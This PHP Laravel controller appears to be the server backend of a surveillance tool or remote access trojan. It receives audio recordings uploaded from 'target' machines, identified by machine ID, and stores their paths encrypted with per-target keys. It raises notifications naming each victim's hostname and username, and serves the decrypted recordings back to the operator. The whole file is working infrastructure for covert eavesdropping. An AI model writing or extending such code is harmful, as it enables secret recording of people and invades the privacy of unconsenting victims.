<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Audio;
use App\Models\Notification;
use App\Models\Target;
use Illuminate\Http\Request;

class AudioController extends Controller
{
    public function post(Request $request)
    {
        $data = $request->validate([
            'id' => 'required|string',
            'audio' => 'required|mimetypes:audio/mpeg,audio/wav,audio/x-wav,audio/ogg',
        ]);

        $audio = $request->file('audio');
        $filename = time() . '_' . uniqid() . '.' . $audio->getClientOriginalExtension();
        $audio->move(public_path('uploads/audio'), $filename);
        $path = 'uploads/audio/' . $filename;

        $target = Target::where('machine_id', $data['id'])->first();
        if ($target)
        {
            $record = [
                'target_id' => $data['id'],
                'path' => base64_encode(openssl_encrypt(
                    $path,
                    'AES-256-cbc',
                    $target->key,
                    OPENSSL_RAW_DATA,
                    $target->iv
                    ))
                ];

            Audio::create($record);

            Notification::create([
                'host' => $target->hostname . '\\' . $target->username,
                'action' => 'New recording uploaded',
                'read' => false,
                'target_id' => $data['id']
            ]);
        }

        return response()->json([]);
    }

    public function getAudios(Request $request)
    {
        $data = $request->validate([
            'id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['id'])->first();
        if (!$target) 
        {
            return response()->json([
                'status' => 'failed',
                'message' => 'failed',
                'data' => null
            ]);
        }

        $limit = $request->get('limit', 5);
        $recordings = Audio::where('target_id', $data['id'])
            ->select('id', 'path', 'created_at')
            ->orderBy('id', 'desc')
            ->paginate($limit);

        $recordings->getCollection()->transform(function ($recording) use ($target) {
            $recording->path = asset(openssl_decrypt(base64_decode($recording->path),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            )); 

             return $recording;
        });

        return response()->json([
            'status' => 'success',
            'message' => 'success',
            'data' => $recordings
        ]);
    }

    public function getAudio($id, Request $request)
    {
        $data = $request->validate([
            'target_id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['target_id'])->first();
        if (!$target)
        {
            return response()->json([
                'status' => 'failed',
                'message' => 'Audio not found',
                'data' => null
            ]);
        }

        $recording = Audio::where('target_id', $data['target_id'])
            ->where('id', $id)
            ->select('id', 'path', 'created_at')
            ->first();
        if ($recording)
        {
            $recording->path = asset(openssl_decrypt(base64_decode($recording->path),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            ));

            return response()->json([
                'status' => 'success',
                'message' => 'success',
                'data' => $recording
            ]);
        }

        return response()->json([
                'status' => 'failed',
                'message' => 'Audio not found',
                'data' => null
            ]);
    }
}
